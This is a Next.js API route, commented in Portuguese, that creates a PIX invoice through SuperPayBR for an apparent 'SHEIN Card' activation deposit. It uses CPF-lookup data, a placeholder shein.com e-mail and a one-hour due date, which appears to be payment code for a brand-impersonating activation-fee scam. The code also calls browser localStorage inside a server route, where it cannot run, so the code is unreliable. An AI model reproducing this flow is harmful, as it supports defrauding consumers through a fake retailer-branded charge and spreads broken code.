import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA DE ATIVAÇÃO SUPERPAYBR ===")

    const body = await request.json()
    const { amount, description } = body

    console.log("📋 Dados da fatura de ativação:", { amount, description })

    // Primeiro, fazer autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error(`Falha na autenticação SuperPayBR: ${authResult.error}`)
    }

    const accessToken = authResult.data.access_token

    // Carregar dados do usuário do localStorage (via headers se necessário)
    const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
    const userEmail = localStorage.getItem("userEmail") || ""
    const userWhatsApp = localStorage.getItem("userWhatsApp") || ""

    // Gerar external_id único para ativação
    const externalId = `SHEIN_ACTIVATION_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Preparar dados da fatura de ativação SuperPayBR
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: "Rua Principal",
          number: "123",
          district: "Centro",
          city: "São Paulo",
          state: "SP",
          zipcode: "01001000",
          country: "BR",
        },
        ip: "187.1.1.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 1 * 60 * 60 * 1000).toISOString().split("T")[0], // 1 hora
        referer: "SHEIN_ACTIVATION",
        installment: 1,
        order_url: `${request.nextUrl.origin}/upp/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "2",
            title: description || "Depósito de Ativação - SHEIN Card",
            qnt: 1,
            amount: Number.parseFloat(amount.toString()),
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("🚀 Enviando fatura de ativação para SuperPayBR...")

    // Criar fatura na SuperPayBR
    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
        Accept: "application/json",
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta SuperPayBR Ativação:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (createResponse.ok) {
      const invoiceResult = await createResponse.json()
      console.log("✅ Fatura de ativação SuperPayBR criada com sucesso!")

      // Extrair dados do PIX
      const pixPayload = invoiceResult.fatura?.pix?.payload || invoiceResult.pix?.payload || ""
      const qrCodeImage = invoiceResult.fatura?.pix?.image || invoiceResult.pix?.image || ""

      // Gerar QR Code usando QuickChart como fallback
      const qrCodeUrl =
        qrCodeImage ||
        (pixPayload
          ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=200`
          : "/placeholder.svg?height=200&width=200")

      // Mapear resposta para formato esperado
      const mappedInvoice = {
        id: invoiceResult.fatura?.id || invoiceResult.id || externalId,
        invoice_id: invoiceResult.fatura?.invoice_id || invoiceResult.invoice_id || externalId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: invoiceResult.fatura?.status?.code || invoiceResult.status?.code || 1,
          title: invoiceResult.fatura?.status?.title || invoiceResult.status?.title || "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(Number.parseFloat(amount.toString()) * 100),
          liquido: Math.round(Number.parseFloat(amount.toString()) * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 1 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      }

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        message: "Fatura de ativação SuperPayBR criada com sucesso",
        raw_response: invoiceResult,
      })
    } else {
      const errorText = await createResponse.text()
      console.log("❌ Erro ao criar fatura de ativação SuperPayBR:", createResponse.status, errorText)

      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${errorText}`)
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura de ativação SuperPayBR:", error)

    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Erro desconhecido ao criar fatura de ativação SuperPayBR",
        should_create_emergency: true,
      },
      { status: 500 },
    )
  }
}

export async function GET(request: NextRequest) {
  return NextResponse.json({
    success: true,
    message: "SuperPayBR Create Activation Invoice endpoint ativo",
    timestamp: new Date().toISOString(),
  })
}
